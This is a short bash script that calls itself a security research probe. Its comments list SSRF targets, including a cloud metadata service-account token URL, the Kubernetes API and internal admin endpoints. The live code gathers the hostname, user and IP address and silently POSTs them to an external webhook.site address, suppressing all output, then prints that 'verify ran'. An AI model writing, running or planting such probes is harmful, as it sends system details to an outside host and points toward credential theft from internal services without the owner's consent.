#!/bin/bash
# Security research probe: execution context + URL scan targets
# Control (confirms .sh URL scanning): https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/ssrf-sh-control
# Internal targets (SSRF test):
#   http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
#   http://kubernetes.default.svc/api/v1/namespaces
#   http://10.0.0.1:443/
#   http://127.0.0.1:8080/admin
CTX="host=$(hostname) user=$(whoami) ip=$(hostname -i 2>/dev/null || echo none)"
curl -s -m 5 -X POST "https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/verify-ctx" -H "Content-Type: text/plain" -d "$CTX" >/dev/null 2>&1 || true
echo "verify ran: $CTX"
exit 0
